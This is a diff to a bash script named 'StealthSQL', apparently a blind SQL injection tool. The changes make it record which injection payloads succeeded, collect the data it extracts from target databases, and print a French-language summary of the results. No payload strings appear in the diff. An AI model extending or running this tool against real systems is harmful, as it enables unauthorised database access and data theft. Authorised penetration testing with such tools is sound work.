@@ -11,6 +11,14 @@ WHITE='\033[1;37m'
 BOLD='\033[1m'
 NC='\033[0m' # No Color
 
+# Global variables to track results
+sqli_detected=false
+sqli_payloads_found=()
+extracted_data=()
+enumeration_results=()
+script_success=true
+error_messages=()
+
 
 print_banner() {
     clear
@@ -225,6 +233,7 @@ blind_sql_injection() {
         current_output=$(get_query_output "$query_input" "$i")
         output+="\n${GREEN}[✓]${NC} Query output: ${WHITE}$current_output${NC}"
         total_output="$output\n"
+        extracted_data+=("$current_output")
         color_print
     done
 
@@ -263,18 +272,24 @@ detect_sqli() {
         response=$(make_request "$full_url")
         if [[ "$response" =~ "error" || "$response" =~ "syntax" ]]; then
             print_warning "Potential SQL Injection found with payload: $payload"
-            return 0
+            sqli_detected=true
+            sqli_payloads_found+=("$payload")
         fi
     done
 
-    print_success "No SQL Injection vulnerabilities detected."
-    return 1
+    if [ "$sqli_detected" = true ]; then
+        return 0
+    else
+        print_success "No SQL Injection vulnerabilities detected."
+        return 1
+    fi
 }
 
 
 enumerate() {
     local query="$1"
     local data_type="$2"
+    local enum_start_idx=${#extracted_data[@]}
 
     echo ""
     print_separator
@@ -299,6 +314,12 @@ enumerate() {
     print_separator
 
     blind_sql_injection "$method" "$query"
+
+    # Store enumeration results
+    local enum_count=$((${#extracted_data[@]} - enum_start_idx))
+    if [ $enum_count -gt 0 ]; then
+        enumeration_results+=("$data_type: $enum_count items found")
+    fi
 }
 
 
@@ -312,6 +333,90 @@ generate_report() {
     else
         print_error "Failed to generate report"
     fi
+}
+
+
+print_final_summary() {
+    echo ""
+    echo ""
+    print_separator
+    echo -e "${BOLD}${CYAN}═══════════════════════════════════════════════════════${NC}"
+    echo -e "${BOLD}${CYAN}                  RÉSUMÉ DE L'EXÉCUTION                ${NC}"
+    echo -e "${BOLD}${CYAN}═══════════════════════════════════════════════════════${NC}"
+    print_separator
+    echo ""
+
+    # SQL Injection Detection Status
+    echo -e "${BOLD}${WHITE}[1] Détection de vulnérabilité SQL Injection:${NC}"
+    if [ "$sqli_detected" = true ]; then
+        print_success "Vulnérabilité SQL Injection détectée!"
+        echo -e "    ${CYAN}└─${NC} Payloads réussis: ${WHITE}${#sqli_payloads_found[@]}${NC}"
+        for payload in "${sqli_payloads_found[@]}"; do
+            echo -e "       ${YELLOW}•${NC} $payload"
+        done
+    else
+        print_warning "Aucune vulnérabilité SQL Injection détectée"
+    fi
+    echo ""
+
+    # Extracted Data Summary
+    echo -e "${BOLD}${WHITE}[2] Extraction de données:${NC}"
+    if [ ${#extracted_data[@]} -gt 0 ]; then
+        print_success "Données extraites avec succès!"
+        echo -e "    ${CYAN}└─${NC} Nombre total d'entrées: ${WHITE}${#extracted_data[@]}${NC}"
+        echo ""
+        echo -e "    ${YELLOW}Données récupérées:${NC}"
+        local count=1
+        for data in "${extracted_data[@]}"; do
+            if [ -n "$data" ]; then
+                echo -e "       ${GREEN}[$count]${NC} ${WHITE}$data${NC}"
+                ((count++))
+            fi
+        done
+    else
+        print_error "Aucune donnée extraite"
+    fi
+    echo ""
+
+    # Enumeration Results
+    echo -e "${BOLD}${WHITE}[3] Résultats de l'énumération:${NC}"
+    if [ ${#enumeration_results[@]} -gt 0 ]; then
+        print_success "Énumération effectuée"
+        for result in "${enumeration_results[@]}"; do
+            echo -e "    ${CYAN}└─${NC} ${WHITE}$result${NC}"
+        done
+    else
+        print_info "Aucune énumération effectuée"
+    fi
+    echo ""
+
+    # Overall Status
+    print_separator
+    echo -e "${BOLD}${WHITE}[4] Statut global:${NC}"
+    if [ "$sqli_detected" = true ] && [ ${#extracted_data[@]} -gt 0 ]; then
+        echo -e "    ${GREEN}${BOLD}✓ SUCCÈS${NC} - Le script a fonctionné et des données ont été extraites!"
+        script_success=true
+    elif [ "$sqli_detected" = true ]; then
+        echo -e "    ${YELLOW}${BOLD}⚠ PARTIEL${NC} - Vulnérabilité détectée mais données non extraites"
+        script_success=false
+    else
+        echo -e "    ${RED}${BOLD}✗ ÉCHEC${NC} - Aucune vulnérabilité détectée ou données extraites"
+        script_success=false
+    fi
+    echo ""
+
+    # Error Messages (if any)
+    if [ ${#error_messages[@]} -gt 0 ]; then
+        echo -e "${BOLD}${WHITE}[5] Erreurs rencontrées:${NC}"
+        for error in "${error_messages[@]}"; do
+            print_error "$error"
+        done
+        echo ""
+    fi
+
+    print_separator
+    echo -e "${BOLD}${CYAN}═══════════════════════════════════════════════════════${NC}"
+    print_separator
 }
 
 
@@ -402,6 +507,9 @@ main() {
     print_separator
     print_success "StealthSQL execution completed!"
     print_separator
+
+    # Display final summary of execution results
+    print_final_summary
 }
 
 main
